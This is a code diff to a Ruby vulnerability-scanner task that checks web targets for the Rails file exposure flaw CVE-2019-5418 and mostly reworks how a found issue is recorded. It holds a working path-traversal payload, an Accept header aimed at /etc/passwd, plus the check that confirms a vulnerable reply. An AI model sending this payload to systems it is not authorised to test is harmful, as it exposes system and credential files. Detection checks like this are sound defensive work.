@@ -8,7 +8,7 @@ class RailsFileExposureCve20195418 < BaseTask
       :pretty_name => "Vuln - Rails File Exposure (CVE-2019-5418)",
       :authors => ["jcran", "jhawthorn"],
       :identifiers => [{ "cve" =>  "CVE-2019-5418" }],
-      :description => "Rails < 6.0.0.beta3, 5.2.2.1, 5.1.6.2, 5.0.7.2, 4.2.11.1 is subject to" + 
+      :description => "Rails < 6.0.0.beta3, 5.2.2.1, 5.1.6.2, 5.0.7.2, 4.2.11.1 is subject to" +
         " an information disclosure vulnerability which can be triggered by a specially crafted" +
         " accept header.",
       :references => [
@@ -34,39 +34,52 @@ class RailsFileExposureCve20195418 < BaseTask
 
     ## Trigger: Accept Header of the following form
     ## ../../../../../../../../../../etc/passwd{{
-    
+
     paths = [""] # Enter any known paths here (spidering first might be a good idea)
     headers = {"Accept" => "../../../../../../../../../../etc/passwd{{"}
 
-    paths.each do |p| 
+    paths.each do |p|
 
       # Request
       uri = "#{_get_entity_name}/#{p}"
       response = http_request :get, "#{uri}", nil, headers
       etc_passwd_body = response.body if response
-      
+
       # Check for validity
-      if response 
+      if response
         if "#{etc_passwd_body}" =~ /root\:x/
           _log "Got vulnerable response: #{response.body}"
-          _create_issue({ 
-            name: "Rails information disclosure", 
+          ############################################
+          ###      Old Issue                      ###
+          ###########################################
+          # _create_issue({
+          #   name: "Rails information disclosure",
+          #   type: "vulnerability",
+          #   severity: 1,
+          #   status: "confirmed",
+          #   description: "This issue found on #{uri}, described in CVE-2019-5418, allows an anonymous user" +
+          #    " to gather internal files from the affected system, up to and including the" +
+          #    " /etc/shadow file, depending on permissions. The 'render' command must be" +
+          #    " used to render a file from disk in order to be vulnerable",
+          #   details: {
+          #     cve: "CVE-2019-5418",
+          #     uri: uri,
+          #     data: etc_passwd_body }
+          # })
+          ############################################
+          ###      New Issue                      ###
+          ###########################################
+          _create_linked_issue("rails_information_disclosure_cve_2019-5418",{
             type: "vulnerability",
-            severity: 1,
-            status: "confirmed",
-            description: "This issue found on #{uri}, described in CVE-2019-5418, allows an anonymous user" + 
-             " to gather internal files from the affected system, up to and including the" + 
-             " /etc/shadow file, depending on permissions. The 'render' command must be" + 
-             " used to render a file from disk in order to be vulnerable",
-            details: { 
+            details: {
               cve: "CVE-2019-5418",
-              uri: uri, 
+              uri: uri,
               data: etc_passwd_body }
           })
         else
           _log "Got non-vulnerable response: #{response.body}"
         end
-      else 
+      else
         _log "Empty response at #{uri}"
       end
     end
